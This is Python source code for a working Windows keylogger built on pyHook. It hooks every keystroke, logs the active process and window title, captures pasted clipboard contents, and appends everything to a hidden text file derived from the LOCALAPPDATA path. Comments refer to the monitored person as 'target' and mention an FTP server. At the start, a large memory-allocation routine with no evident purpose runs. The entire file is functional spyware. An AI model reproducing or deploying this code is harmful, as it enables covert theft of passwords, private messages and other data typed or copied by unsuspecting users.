from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import os
import shutil
from time import gmtime, strftime
import random

#Keylogger Vars
user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None
data=" "
paste_limit=500

def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message

    return result


doAllocate(2621440)



#This is triggered every time a key is pressed
#So you can think of this as the main entry point for all other functions
def KeyStroke(event):

	global current_window,data

	# check to see if target changed windows
	if event.WindowName != current_window:

		current_window = event.WindowName        
		get_current_process()

	if event.Ascii==8 or event.Ascii==127:
		data=data[:-1]
	elif event.Ascii==13 or event.Ascii==10:
			data=data+'\n'
	elif event.Ascii==32:

		data=data+' '
	# if they pressed a standard key
	elif event.Ascii > 32 and event.Ascii < 127:
		data=data+chr(event.Ascii)
	else:

	# if [Ctrl-V], get the value on the clipboard
	# added by Dan Frisch 2014
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			if (len(pasted_value) < paste_limit):
				writeToFile("[PASTE] - %s" % (pasted_value))
		else:
			data=data+chr(event.Ascii)

	if len(data)>100:
		writeToFile(data)
		data=""
	# pass execution to next hook registered 
	return True

#This gets the current process, so that we can display it on the log
def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    #Write
    writeToFile("\n")
    writeToFile("[%s]" % (window_title.value))
    writeToFile("\n")

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return
    
def writeToFile(key):

    from os import getenv
    global open_type
    path = getenv("LOCALAPPDATA")#Specify your FTP Server address
    path1= path.replace('\\','')	#Specify your FTP Server address
    path2= path1.replace(':','')
    path2=path2+".txt"
    filename =path2
    try:
        open_type = 'a+'
    except:
        open_type = 'a+'
    #print "A",open_type
    target = open(filename,open_type)
    target.write(key)
    target.close();



#Make sure that given directory exists ; Create if Necessary

# create and register a hook manager 
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()

